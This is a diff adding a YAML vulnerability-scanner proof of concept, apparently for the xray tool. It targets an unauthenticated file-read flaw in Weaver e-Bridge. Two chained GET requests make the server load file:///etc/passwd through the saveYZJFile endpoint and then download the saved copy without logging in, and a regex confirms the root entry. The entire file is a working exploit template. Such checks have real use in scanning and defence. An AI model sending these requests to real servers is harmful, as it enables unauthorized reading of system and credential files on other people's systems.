@@ -1,0 +1,19 @@
+name: poc-yaml-weaver-ebridge-file-read-linux
+rules:
+  - method: GET
+    path: "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
+    search: |
+      \"id\"\:\"(?P<var>.+?)\"\,
+  - method: GET
+    path: "/file/fileNoLogin/{{var}}"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: mvhz81
+  info: e-bridge-file-read for Linux
+  links:
+    - https://mrxn.net/Infiltration/323.html
